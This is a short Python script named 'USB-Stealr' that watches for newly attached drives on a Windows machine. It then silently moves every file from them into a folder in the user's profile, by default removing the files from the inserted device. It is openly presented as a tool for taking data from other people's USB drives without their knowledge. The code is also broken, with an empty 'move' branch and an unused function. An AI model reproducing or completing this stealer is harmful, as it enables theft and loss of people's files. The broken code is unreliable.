# Drear Programewr
# when i wrote this code , only god and i khew how it worked .
# This code needs to be optimized :)
# Have fun

import win32api , glob , os ,shutil , getpass
user_pc = getpass.getuser()
try:
	create_loc = ("C:\\Users\\"+user_pc+"\\USB-Stealr\\") # your specific path (Change this if you like )
	os.mkdir(create_loc)
except FileExistsError:
	pass

def operation_F(exist_drive):

	root_src_dir = os.path.join(exist_drive)
	root_target_dir = os.path.join("C:\\Users\\"+user_pc+"\\USB-Stealr\\") # your specific path (Change this if you like )

	operation= 'move' # 'copy' or 'move' (Change this if you like )

	for src_dir, dirs, files in os.walk(root_src_dir):
	    dst_dir = src_dir.replace(root_src_dir, root_target_dir)
	    if not os.path.exists(dst_dir):
	        os.mkdir(dst_dir)
	    for file_ in files:
	        src_file = os.path.join(src_dir, file_)
	        dst_file = os.path.join(dst_dir, file_)
	        if os.path.exists(dst_file):
	            os.remove(dst_file)
	        if operation is 'copy':
	            shutil.copy(src_file, dst_dir)
	        elif operation is 'move':

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
list_all_drives=["C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","J:\\","K:\\","R:\\","U:\\","O:\\","S:\\","X:\\","B:\\","N:\\","Q:\\"]
for i in drives:
	if i in list_all_drives:
		list_all_drives.remove(i)
def unix_find(pathin):
    return [os.path.join(path) for (path, dirs, files) in os.walk(pathin)]

while True:
	for c in list_all_drives:
		if os.path.exists(c):
			operation_F(c)
